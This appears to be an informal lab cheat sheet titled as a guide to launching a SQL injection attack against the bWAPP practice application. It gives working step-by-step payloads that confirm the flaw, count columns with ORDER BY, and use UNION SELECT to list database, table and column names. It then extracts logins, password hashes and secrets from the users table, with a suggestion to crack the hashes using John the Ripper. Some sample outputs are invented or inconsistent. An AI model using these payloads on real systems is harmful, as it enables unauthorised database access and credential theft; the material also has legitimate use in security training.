 # cheat sheet on SQL injection attack. enjoy!
''

Launch a SQL Injection Attack

SQL Injection or SQLi is an injection attack that allows the attack to execute malicious SQL statements in a text box. Web applications are built with authentication and authorization. However, if not programmed properly, the attacker can use the SQL statements to bypass application security controls and measures. The SQL injection attack can allow the attacker to add, remove, modify, or manipulate the data in the database in whichever he or she likes. If the SQL injection attack is successful, the content of the entire database is at the mercy of the attacker.

In this task, you will learn to launch a SQL injection attack. To do this, perform the following steps:

''

... loading ..


1. The SQL Injection (GET/Search) Webpage is displayed.

> Without entering any data in the Search for a movie textbox, click S   earch.

> The results are displayed. This means that there is a database in the backend that contains the movie list.

2. Let’s test if the application is prone to an SQL Injection attack. In the search box, type the following:

> m’

> Press Search

> Notice the error that confirms that the SQL Injection attack is possible. A notification bar appears. Click No.

3. Next, you need to find the total number of columns that exist in the original SQL statement. Type the following code in the textbox:
Note: The value of 1 is used to test if there is only one column in the database.

> m’ order by 1-- -

> Press Search


> > error you have an error in your SQL syntax, check the manual that 
  corrisponds to your (X)  MYSQL server version for the syntax to use
  '%" at line (x) 1

> Notice the output. This means that there are more than one column in the database, and column 1 does not have the movie list.


4. Next, try another random number. Type the following code in the text box:

> m’ order by 8-- -

> Press Search

> > Error: Unknown column '8'in'order clause'

> Note: The value of 1 is used to test if there is only one column in the database.

This means that there are less than 8 columns.

5. Next, try another random number. Type the following code in the textbox:
Note: The value of 1 is used to test if there is only one column in the database.

> m’ order by 7-- -

> Press Search

> > Error: Unknown column '8' in 'order clause'

''

There is no error in column 7, which confirms that there are a total of 7 columns in the original SQL statement.


''

6. You will now need to select all columns at once using the union all    select statement. To do this, type the following statement:

> m' union all select 1,2,3,4,5,6,7 -- -

> Click Search

> Notice that there is no error. The output is now generated.

===================================================================
 title         realease                 char       genere    IMDB

 john the..     3.2.4               ripper         cracker   not rated


===================================================================

( this is just an imaginary DB reflecting the example in the lab )

7. You need to find the database name now. To do this, type the followi   ng statement:

> m' union all select 1,database(),3,4,5,6,7 -- -

> Click Search.

> notice there is no error. the output is now generated

> > The name of the database appears in the Title column.

8. Next, you need to find the table names in the database, which is bWAPP. To do this, type the following statement:

> m' union all select 1,table_name,3,4,5,6,7 from information_schema.tables where table_schema=database() -- -

> click search

> > Notice the output lists the table names. The statement that you executed has found five tables in the bWAPP database
=================================================================
   Title	Release     Characters     Genere    IMDB       |
----------------------------------------------------------	|   						                       |
blog		3		34		3	lnk	|
								|
heroes		2		23		3	lnk	|
								|
movies		3		34		3	lnk	|
								|
users		7		5		3	lnk	|								       |
visitors	9		123		8	lnk	|
								|
								|
=================================================================


9. Let’s explore the users table and find its columns. To to this, type the following statement:

> m' union all select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name='users' and table_schema=database() -- -


> click search



> > Notice the output reveals the names of the columns
    there is a total of 9 columns that were found in the users table.

=================================================================
   Title	Release     Characters     Genere    IMDB       |
----------------------------------------------------------	|   						                       |
id		3		5	2		4	|
								|
login		3		5	2		5	|
								|
password	3		5	2		3	|
								|
email		3		4	2		9	|
								|
secret		3		8	2		6	|
								|
activation_code	4		9	2		6	|
								|
activated	4		3	2		6	|
								|
reset_code	2		2	2		2	|
								|
admin		3		3	2		5	|
								|
								|
								|
								|
=================================================================

> > Showing the total number of columns in the table.


10. Let’s now explore the values that are in the following columns:

    login
    Password
    secret

> Type the following statement:

> m' union all select 1,login,password,secret,5,6,7 from users -- -

> Click Search

11. 

> Notice the output. Two records have been found in the users table.

Note: You have now got the hashed value as a password. You can use any password cracking tool, such as John the Ripper, and retrieve the value 

> When you run value through John the Ripper, the password is decrypted  as a bug. Remember, this is the username you had used to log in to t   his Web application






























